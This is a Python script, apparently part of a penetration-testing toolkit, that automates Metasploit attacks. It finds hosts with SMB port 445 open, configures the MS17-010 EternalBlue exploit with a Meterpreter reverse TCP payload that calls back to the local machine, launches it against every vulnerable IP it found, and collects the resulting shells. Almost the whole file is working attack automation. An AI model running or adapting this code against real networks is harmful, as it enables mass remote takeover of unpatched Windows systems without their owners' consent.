from metasploit_script import *
from json_data_processing_script import *

import pdb
import socket


def script_automate():
    # check opened port
    opened_vuln_port, ip_vuln = look_for_port()
    #print(opened_vuln_port)


    #test with putting an unexploitable
    #ip_vuln.append(('172.16.1.1','445'))
    #print(ip_vuln)


    # launch metasploit
    client, console = main_connection()
    #print(client)


    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()


    #######################################CHECK OPENED PORT####################################
    if '445' in opened_vuln_port:
        auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
        exploit_name = 'windows/smb/ms17_010_eternalblue'

        #####################################GET EXPLOIT########################################

        exploit = main_run_exploit(exploit_name, client)

        ######################################GET IP VULN FOR 445###############################

        vuln_ip_445 = look_for_ip_associated_port(ip_vuln, '445')
        #print(vuln_ip_445)

        #######################################CONFIG OPTIONS AND PAYLOAD#######################

        #pdb.set_trace()
        running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', client)

        payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
        running_config_payload = main_config_payload('LHOST', hostname,'STR', payload)

        for ip in vuln_ip_445:
            #print(ip)
            main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
            json, session_create = main_exe_exploit(payload, exploit, client)

        #print(client.sessions.list)
        sessions_created = client.sessions.list
        return client, sessions_created
